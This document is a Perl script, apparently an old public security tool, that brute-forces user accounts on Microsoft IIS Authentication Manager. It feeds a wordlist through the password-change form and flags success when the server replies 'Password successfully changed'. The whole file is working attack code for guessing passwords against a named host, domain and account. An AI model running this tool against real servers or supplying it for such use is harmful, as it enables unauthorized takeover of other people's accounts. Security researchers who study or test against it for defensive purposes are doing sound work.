##########################################################################
#################
# Miscrosoft IIS Authentication Manager BruteForce Tool - By JeiAr
http://www.gulftech.org
##########################################################################
#################
# This tool can be used to brute force user accounts via dictionary
attack on the Microsoft
# IIS Authentication Manager. More details here
http://www.securityfocus.com/archive/1/8515
##########################################################################
#################

use LWP::UserAgent;

##########################################################################
#################
# Time to create the new LWP User Agent, Clear the screen, And print out
the scripts header
##########################################################################
#################

$ua = new LWP::UserAgent;
$ua->agent("AgentName/0.1 " . $ua->agent);
system('cls');
&header;

##########################################################################
#################
# Gather all user inputted data. Such as the domain name, host and
location of the wordlist
##########################################################################
#################
 
print "Host: ";
$host=<STDIN>;
chomp $host;
print "Domain: ";
$domain=<STDIN>;
chomp $domain;
print "Account: ";
$account=<STDIN>;
chomp $account;
print "Word List: ";
$list=<STDIN>;
chomp $list;

##########################################################################
#################
# Opens the wordlist and puts the data into an array. afterward setting
the count variables
##########################################################################
#################

open (DATAFILE, "$list");
@datafile = <DATAFILE>;
chomp(@datafile);
$length = @datafile;
$count = 0;
$found = 0;

&space;
print "Cracked Accounts\n";
print "----------------\n";

##########################################################################
#################
# Creates the HTTP request, Checks the responses, then prints out the
username if it exists
##########################################################################
#################

while ($count < $length) {
$password = (@datafile[$count]);
my $req = new HTTP::Request POST => "http://$host/_AuthChangeUrl?";
   $req->content_type('application/x-www-form-urlencoded');
   $req->content
("domain=$domain&acct=$account&old=$password&new=$password&new2=$password"
);
my $res = $ua->request($req);
$pattern = "Password successfully changed";  
$_ = $res->content;
if (/$pattern/) {
print "$account : $password\n";
last if (/$pattern/);
  }
 $count++;
}

##########################################################################
#################
# Thats all folks. Prints out the final details and footer. Rest is just
the subroutines :)
##########################################################################
#################

&space;
&footer;

sub header {
print "IIS Auth Manager Brute Forcing Tool By JeiAr
[http://www.gulftech.org] \n";
print "-------------------------------------------------------------------
--- \n";
}

sub footer {
print "Session Results:\n";
print "--------------------\n";
print "Number Of Words : $length \n";
print "Number Of Tries : $count  \n";
}

sub space {
print "\n" x2;
} 